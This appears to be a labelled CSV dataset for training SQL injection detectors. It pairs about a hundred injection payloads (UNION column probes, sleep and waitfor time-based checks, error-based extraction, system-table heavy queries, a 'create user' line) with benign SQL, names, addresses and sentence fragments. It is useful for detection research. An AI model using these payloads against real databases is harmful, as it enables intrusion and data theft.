Sentence,Label
"1  )   where 5385  =  5385 or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1
0o380ado6,0
cercs,0
nazareth,0
SELECT * FROM adjective WHERE larger IN  ( SELECT tried FROM pond ) ,0
" select * from users where id = '1'<@$$ union select 1,version (  )  -- 1'",1
barriga requena,0
"1""  )   and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and   (  ""zyeo"" like ""zyeo",1
SELECT * FROM kept WHERE ability BETWEEN '1996-07-01' AND '1996-07-31',0
SELECT TOP 3 * FROM store WHERE giant = 'graph',0
"1' where 4039 = 4039 union all select null,null,null,null,null,null,null,null--",1
SELECT DISTINCT frame FROM write,0
"1'|| ( select 'svbf' where 7017 = 7017 or elt ( 6272 = 6272,sleep ( 5  )  )   ) ||'",1
bossert,0
9167,0
9122440516217949,0
"1' )  or  ( select 9173 from ( select count ( * ) ,concat ( 0x7171706a71, ( select  ( elt ( 9173 = 9173,1  )  )   ) ,0x717a767a71,floor ( rand ( 0 ) *2  )  )  x from information_schema.character_sets group by x ) a )  and  ( 'lwlh' = 'lwlh",1
eulalio,0
10665,0
" With construction Lower Saxony Bridge , Rhenus Midgard continuing focus coal exports power stations one major powers sector Europe ",0
2417,0
sariego,0
atigrada,0
dowd,0
SELECT COUNT ( saddle ) FROM organization,0
84q42o,0
"1 )  or 2367 =  ( select count ( * )  from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",1
"1""  )  )   or char ( 119 ) ||char ( 100 ) ||char ( 99 ) ||char ( 121 )  = regexp_substring ( repeat ( right ( char ( 1441 ) ,0 ) ,5000000000 ) ,null ) --",1
"plza. okendo 185, 6?c",0
"-5478""  )   where 4100  =  4100 or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  --",1
"INSERT INTO were  ( tightly, must, house )  VALUES  ( 'weight', 'because', 'mad' )  ",0
SELECT option_value FROM wp_options WHERE option_name  =  '_transient_doing_cron' LIMIT 1,0
sheara,0
%2A%7C,1
1'  )   and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and   (  'izyf'  =  'izyf,1
2244921574247376,0
-1854'  )   as fmmq where 7326  =  7326 or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )  --,1
"1'  )  )   as ticp where 9794 = 9794 union all select null,null,null,null,null,null,null,null--",1
" And started nonprofit , ASCOVIME , travels rural areas weekends provide free medical care ",0
-3597'  )  )   order by 1--,1
"-4350""   )    )    as mmwq where 9801  =  9801 or   (  8520  =  2834  )  *2834--",1
tribaldos,0
 In future task promote church life local basis ,0
"c/ gerardo de alvear, 119 10f",0
blondell3,0
SELECT * FROM just 3 SELECT * FROM there,0
juana,0
foa@mcrspain.lr,0
"1' and char  (  109  )  ||char  (  79  )  ||char  (  70  )  ||char  (  90  )    =  regexp_substring  (  repeat  (  right  (  char  (  5012  )  ,0  )  ,5000000000  )  ,null  )  --",1
1'  )   where 6045  =  6045,1
"1' where 5801 = 5801 or row ( 1045,7562 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select  ( elt ( 1045 = 1045,1  )  )   ) ,0x717a767a71,floor ( rand ( 0 ) *2  )  )  x from  ( select 8488 union select 5584 union select 3051 union select 1210 ) a group by x ) --",1
"1 where 2988  =  2988 or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1
 or 0 = 0 --,1
21613516w,0
select   (  case when   (  5796  =  8326  )   then 5796 else 5796*  (  select 5796 from information_schema.character_sets  )   end  )  #,1
49240,0
garabero,0
1'+  (  select 'mxlb' where 4900  =  4900,1
"-6263"" union all select 8005,8005#",1
7208320116493837,0
"1"" where 3933 = 3933 or extractvalue ( 1297,concat ( 0x5c,0x7171706a71, ( select  ( elt ( 1297 = 1297,1  )  )   ) ,0x717a767a71  )  )  --",1
SELECT TOP 3 * FROM replied WHERE fill = 'ordinary',0
5170755929650123,0
"SELECT CustomerName, CONCAT ( Address,', ',PostalCode,', ',City,', ',Country )  AS Address FROM Customers;",0
33971,0
SELECT * FROM soldier WHERE tide  BETWEEN 10 AND 20,0
"1%""  )  )   )  union all select null,null,null--",1
SELECT * FROM mean WHERE gentle BETWEEN 'thy' AND 'green',0
trace,0
SELECT * FROM having 3,0
" select * from users where id  =  '1' or @ @1  =  1 union select 1,version  (    )   -- 1'",1
idelfonsa,0
"INSERT INTO nearer  ( stairs, officer, dear )  VALUES  ( 'band', 'throw', 'tales' )  ",0
"  UPDATE nice SET surprise =  'rope', City =  'beginning' WHERE later =  image",0
chaney2@adondeir.ng,0
SELECT * FROM seed FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM particular,0
"calle evora, 58,",0
SELECT * FROM completely WHERE bean = 'harder' LIMIT 3,0
eslava,0
huertas acosa,0
select pg_sleep ( 5 ) #,1
 This really must nation ,0
"1'  )   as bdei where 9531  =  9531 and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",1
"-8309'||  (  select 'qecl' where 8449  =  8449 union all select 8449,8449,8449,8449,8449,8449,8449--",1
byrska@diagnosticoradiologico.nz,0
"-4408"" )  or 6872 = 6872 and  ( ""oenu"" = ""oenu",1
"avenida baraain, 51, 1?h",0
12163,0
1 rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )   # mekk,1
-3752%' union all select 9351--,1
 He first covered death 89-year-old pocketed money year half ,0
SELECT TOP 3 * FROM doubt WHERE smaller = 'hidden',0
"or 0 = 0 #""",1
2145088995876898,0
SELECT * FROM cake WHERE skill = 'bottom'  AND  ( strike = 'interior' OR aloud = 'couple' ) ,0
"1"" )  union all select null,null,null,null,null,null,null#",1
43595,0
fernando,0
SELECT attached ( s )  FROM particles UNION,0
14724400f,0
SELECT * FROM count WHERE right = 'tune'  AND City = 'how',0
SELECT * FROM spend WHERE because BETWEEN 'union' AND 'remember',0
1' )  where 2974 = 2974 and 4386 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 4386 = 4386 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )  --,1
"1 or  ( select 2* ( if  (  (  select * from  ( select concat ( 0x7171706a71, ( select  ( elt ( 8113 = 8113,1  )  )   ) ,0x717a767a71,0x78  )  )  s ) , 8446744073709551610, 8446744073709551610  )  )   ) # lgoz",1
"-3209'+ ( select ldum where 9912 = 9912 union all select 9912,9912,9912,9912#",1
frigiliana,0
negrich,0
lieneman,0
44394,0
"1'  )  )   )  or 8466 = benchmark ( 5000000,md5 ( 0x694a4745  )  )   and   (  (   ( 'gbhd' = 'gbhd",1
gattas,0
"1  ( select  ( case when  ( 5451 = 5451 )  then regexp_substring ( repeat ( right ( char ( 5451 ) ,0 ) ,500000000 ) ,null )  else char ( 108 ) ||char ( 76 ) ||char ( 112 ) ||char ( 116 )  end )  from information_schema.system_users ) ",1
SELECT TOP 50 PERCENT * FROM couple SELECT * FROM use FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM instance,0
"-3672""   )    )    union all select 6093#",1
1' )  where 1502 = 1502 and 3754 =  ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 3754 = 3754 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62  )  )   )  from dual ) --,1
ermindo,0
05619,0
"1""   )    )    and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and    (    (   ""bfko""  =  ""bfko",1
34306,0
1  )  )   or sleep ( 5 )  and   (  (  8285 = 8285,1
17240,0
"select count  (  *  )   from generate_series  (  1,5000000  )   and 'roca'  =  'roca",1
tienchie,0
"1' and make_set ( 8403 = 8403,8899 )  and 'fttd' like 'fttd",1
"-9569%'   )    )    union all select 8405,8405,8405,8405--",1
"1""  )   where 5828  =  5828 or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",1
SELECT thumb ( s ) FROM element INNER JOIN,0
SELECT excitement FROM lunch UNION ALL SELECT human FROM ride ORDER BY leg,0
SELECT * FROM  ( SELECT gift FROM behind ) ,0
1538,0
1'+ ( select 'kiqf' where 5920 = 5920,1
"1"" )  or 4915 =  ( select count ( * )  from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",1
"1 where 2823 = 2823 and 3707 =  ( select count ( * )  from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",1
1 )  order by 1--,1
"  SELECT feelID AS ID, sick AS flag FROM possible",0
"-1748%""   )    )     )   union all select 2987#",1
1769642985963078,0
select   (  case when   (  5698  =  3453  )   then 5698 else 1/  (  select 0  )   end  )  --,1
3313243213262173,0
"-7107""  )  )   )  order by 1#",1
"-2027%"" )  union all select 2048,2048,2048,2048,2048,2048,2048,2048#",1
SELECT * FROM research ORDER BY rush,0
1%'  )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,1
SELECT how,0
conde,0
" Stevie Rochelle Bamford initially found guilty Phuket provincial court June 15 making false claims telling Thai police local taxi driver , two men restraining , carried assault early hours Sunday June 10 ",0
SELECT * FROM arrow  WHERE interest = mouth,0
"select * from generate_series ( 5846,5846,case when  ( 5846 = 5227 )  then 1 else 0 end )  limit 1--",1
SELECT AVG ( solution ) FROM spell SELECT SUM ( addition ) ,0
78153384m,0
"  SELECT signID AS ID, grain AS throat FROM riding",0
hallaran@manjarr.cd,0
"carrer doctor esteve, 124,",0
"-7851""  )  )   or 6872 = 6872 and   (  (  ""dvbw"" like ""dvbw",1
8015,0
SELECT * FROM goes WHERE fell BETWEEN invented09/01/1996needs AND bigger15/31/1996atmosphere,0
 Illinois trying limited basis trucks ,0
"  SELECT electric AS perhaps, see AS [like]  FROM hill",0
"1%'  )  )   )  union all select null,null,null,null,null,null,null--",1
juanhuix,0
niel5,0
43812,0
"1'|| ( select 'pygt' from dual where 5543 = 5543 union all select null,null,null,null,null,null#",1
"1"" waitfor delay '0:0:5' and ""dvfr"" like ""dvfr",1
SELECT * FROM no WHERE heard NOT LIKE '[dog]%',0
SELECT AVG ( effect ) FROM light,0
" And men, must accept highest mind transcendent destiny; minors invalids protected corner, cowards fleeing revolution, guides, redeemers, benefactors, obeying Almighty effort, advancing Chaos Dark",0
epifita,0
" Löffingen: Köpfler still candidate Information online: Although Löffingen , small town Baar , 7,514 residents , described intact infrastructure , forward-looking school , youth senior citizens policies municipal energy companies , thus far no-one registered second mayoral candidate ",0
8971303615649056,0
SELECT * FROM fine ORDER BY wrapped,0
"1'|| ( select 'dukt' where 3206 = 3206 or 4411 =  ( select count ( * )  from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  )  ||'",1
"  UPDATE would SET zoo =  'family', City =  'death' WHERE magnet =  throat",0
SELECT steady ( s FROM complex RIGHT JOIN,0
"-3090"" or make_set ( 9354 = 9354,7185 )  and ""qowe"" like ""qowe",1
SELECT electric ( s )  FROM equally UNION,0
"calle valdibaez 185,",0
"1""   )    )    as xxdm where 4818  =  4818",1
" Mother buried shallow forest grave pension stolen When elderly mother died , man Wolfsburg devised plan ",0
crosby,0
07901950r,0
SELECT TOP 50 PERCENT * FROM temperature,0
1'  )   union all select null--,1
guijo de santa brbara,0
"-7126'   )    )    as fzpp where 8078  =  8078 union all select 8078,8078,8078,8078,8078,8078,8078#",1
"-3377""  )   or 4982  =  6608#",1
-2817%'  )   or 8255  =  3841--,1
secretario espino 67 4?g,0
1' )  and 7533 = 7533 and  ( 'dbjq' = 'dbjq,1
SELECT * FROM earn WHERE strong = 'toward',0
"1"" )  as kfvy where 7305 = 7305 or sleep ( 5 ) --",1
-3161' )  or 8501 = 1796,1
DELETE FROM garden WHERE closer = 'entire',0
SELECT * FROM better WHERE gave = 'slipped',0
' )  or sleep ( __TIME__ )  = ',1
"1 and 9660 =  ( select count ( * )  from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",1
"1' or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and 'jjmt'  =  'jjmt",1
SELECT protection FROM riding,0
1' in boolean mode )  and 9198 = 9198--,1
" I replied, They seem such; I Devil’s child, I live Devil",0
1' )  where 1212 = 1212,1
rio de la cueza 187,0
 Kaplowitz contends premise holds weight epidemic obesity ,0
1  )   where 5774  =  5774,1
0orru6t5,0
"   SELECT out, red, bow FROM pressure WHERE information  IS NULL",0
"-2602' union all select 5715,5715,5715,5715,5715,5715,5715,5715,5715--",1
urueas,0
"1"" where 9173  =  9173 rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )   --",1
"-4236'  )   union all select 2076,2076,2076,2076,2076,2076,2076,2076,2076,2076#",1
"1' where 8430  =  8430 or 7417  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",1
SELECT * FROM bread WHERE war = 'damage',0
51780892a,0
SELECT * FROM they,0
"1'  )   as sjzi where 8242  =  8242 and 9254  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1
" select * from users where id = 1 or "";{"" or 1 = 1 -- 1",1
"select pg_sleep ( 5 )  and ""%"" = """,1
"1"" where 8234 = 8234",1
-1641' union all select 4835#,1
58450202a,0
"-3566' where 3641 = 3641 union all select 3641,3641,3641,3641,3641#",1
" Only goalkeeper , Roman Weidenfeller , first BVB player step onto field , cheers briefly erupt , usually case ",0
herrmann@codwatw.edu,0
witney,0
jezabel,0
3350000000000000,0
"1%""   )    )    and char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",1
jeshua,0
dybenko,0
"exp ( ~ ( select * from  ( select concat ( 0x7171706a71, ( select  ( elt ( 1049 = 1049,1  )  )   ) ,0x717a767a71,0x78  )  )  x  )  )  ",1
"1  )   as amgf where 4308  =  4308 and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )  --",1
yutaka,0
"1"" )  as ckoi where 4674 = 4674 union all select null,null,null,null,null,null,null,null,null,null#",1
"1%""  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and   (  ""%""  =  """,1
SELECT * FROM labor ORDER BY slide,0
" An overview milk egg alternatives Vegan nutrition promotes vegetable alternatives eggs , milk dairy products ",0
8alantos4,0
" On third day , pupils able take overview fascinating city viewing platform Empire State Building , enjoying views height 373 metres ",0
"1'  )  )   and 9254 =  ( select count ( * )  from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",1
33245427p,0
"-4152"" )  where 9781 = 9781 union all select 9781,9781,9781,9781,9781--",1
SELECT TOP 3 * FROM paint WHERE change = 'metal',0
"1 where 6383 = 6383 or elt ( 6272 = 6272,sleep ( 5  )  )  --",1
3628290000000000,0
"1'||  (  select 'uusj' where 2149  =  2149 or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )     )  ||'",1
SELECT AVG ( rice ) FROM car,0
SELECT TOP 3 * FROM loud,0
ejarque barbieri,0
DELETE FROM window WHERE gas = 'tube',0
1 waitfor delay '0:0:5'-- nnnp,1
pamente,0
kirkpatr,0
"1""  )  )   and  ( select * from  ( select ( sleep ( 5  )  )   ) fzno )  and   (  (  ""ykhp"" like ""ykhp",1
"monte campamento 169,",0
comport8ble,0
select sleep  (  5  )   and   (  'vwmx'  =  'vwmx,1
 Bird airlifted safety North Sea rig released back wild A bird airlifted ashore found exhausted North Sea oil rig released back wild ,0
SELECT * FROM native WHERE couple = 'hard',0
"-5827"" )  as lskq where 7683 = 7683 union all select 7683,7683,7683,7683,7683#",1
"-1993%"" )  or 5903 =  ( 'qqpjq'|| ( select case 5903 when 5903 then 1 else 0 end from rdb$database ) ||'qzvzq' )  and  ( ""%"" = """,1
create user name identified by 'pass123',1
SELECT TOP 3 * FROM higher,0
calle vallseca 123,0
moscoso mesen,0
" All sallies rounded law being, inequalities Andes Himmaleh insignificant curve sphere",0
 The Verkehrsclub Deutschland (German Traffic Club) opinion increase two decades &quot; completely appropriate actually long overdue &quot; ,0
SELECT later ( s ) FROM member INNER JOIN,0
cabanillas de la sierra,0
"1'  )  )   )  or 8315 =  ( select count ( * )  from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 )  and   (  (   ( 'zfrs' = 'zfrs",1
3203260000000000,0
"1"" and 7533 = 7533 and ""dqjp"" = ""dqjp",1
suzuki,0
"1' )  as ohcs where 9588 = 9588 or elt ( 6272 = 6272,sleep ( 5  )  )  --",1
carrera,0
-5569' )  as cjaf where 3753 = 3753 union all select 3753#,1
"1%"" )  rlike  ( select * from  ( select ( sleep ( 5  )  )   ) vwyq ) #",1
73ngazo,0
consist+ente,0
SELECT * FROM trap,0
-2951 or 4189  =  2291,1
"-8544%"" or 6872  =  6872 and ""%""  =  """,1
"1%' or 8421 =  ( select count ( * )  from generate_series ( 1,5000000  )  )   and '%' = '",1
"1""   )    )    as xbhp where 7527  =  7527",1
"1', ( select  ( case when  ( 6560 = 2813 )  then 1 else cast ( 1 as int ) / ( select 0 from dual )  end )  from dual ) ",1
05196,0
1'   )    )    as dipp where 1714  =  1714,1
"-3562""  )   as eghl where 7094  =  7094 union all select 7094,7094,7094,7094#",1
"1 )  where 4226 = 4226 or elt ( 5873 = 5873,sleep ( 5  )  )  #",1
fregaci5n,0
2888891461316865,0
